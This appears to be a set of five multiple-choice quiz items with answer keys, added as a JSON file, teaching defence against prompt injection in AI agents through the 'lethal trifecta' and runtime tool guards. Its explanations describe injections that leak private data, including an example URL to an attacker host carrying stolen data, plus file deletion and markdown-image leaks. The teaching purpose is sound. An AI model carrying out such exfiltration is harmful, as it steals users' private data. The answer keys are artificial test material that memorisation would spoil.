@@ -1,0 +1,57 @@
+[
+  {
+    "question": "An agent has `search_crm` (private data) and `fetch_url` (fetches any web page). Users only ask questions; nobody sends email. Is the trifecta present?",
+    "options": [
+      "No: there is no tool that sends anything",
+      "Yes: `fetch_url` ingests untrusted pages and also communicates externally, because the URL the model writes can carry CRM data to the attacker's server",
+      "Only if the model is small",
+      "Only if users paste links"
+    ],
+    "answer": 1,
+    "explanation": "A fetch is a request to a server the model chose. `https://attacker.example/?d=<data>` sends data out, and the page it returns can carry the injection in the first place."
+  },
+  {
+    "question": "Why does the analysis treat a tool without capability labels as having all three legs?",
+    "options": [
+      "Because unlabeled tools are always malicious",
+      "To fail closed: an unreviewed tool might read private data, ingest untrusted text or reach the network, and assuming the worst turns a missing label into a visible alarm instead of a silent gap",
+      "Because the model ignores unlabeled tools",
+      "To make the report longer"
+    ],
+    "answer": 1,
+    "explanation": "Security analysis that assumes the best about unknown components misses exactly the components nobody looked at."
+  },
+  {
+    "question": "A support agent reads tickets (untrusted), looks up customers (private) and sends replies by email. Which change removes a leg while keeping most of the product?",
+    "options": [
+      "Add \"never send customer data to unknown addresses\" to the system prompt",
+      "Ask a human to approve every email the agent sends",
+      "Replace sending with saving a draft that a support agent reviews and sends, so the agent itself has no external channel",
+      "Use a larger model that follows instructions better"
+    ],
+    "answer": 2,
+    "explanation": "A prompt rule is the defense injection defeats. Approval reduces risk but people stop reading after the twentieth prompt, so the leg stays. A draft-only agent has no channel the injection can use."
+  },
+  {
+    "question": "A runtime guard allowed `read_inbox` (private data and untrusted content). The model now asks for `draft_reply` (no legs) and then `send_email`. What should happen?",
+    "options": [
+      "Both are allowed: each tool is safe on its own",
+      "`draft_reply` is allowed; `send_email` is denied because it would complete the trifecta, and the denial does not change the session's recorded legs",
+      "Both are denied because the inbox was read",
+      "`send_email` is allowed if `draft_reply` ran first"
+    ],
+    "answer": 1,
+    "explanation": "The guard decides on the combination of what the session already touched and what the next call adds. A tool with no legs never changes the outcome."
+  },
+  {
+    "question": "Which harm does the lethal trifecta not cover?",
+    "options": [
+      "An injection that makes the agent email the user's files to the attacker",
+      "An injection in a document that makes the agent delete the user's files with its own `delete_file` tool, sending nothing anywhere",
+      "Data leaking through a markdown image URL",
+      "An attacker reading the user's password reset links"
+    ],
+    "answer": 1,
+    "explanation": "The trifecta is about data theft. Destructive or state-changing actions need permission policies and approvals, which is the extra \"changes state\" property in Meta's Agents Rule of Two."
+  }
+]
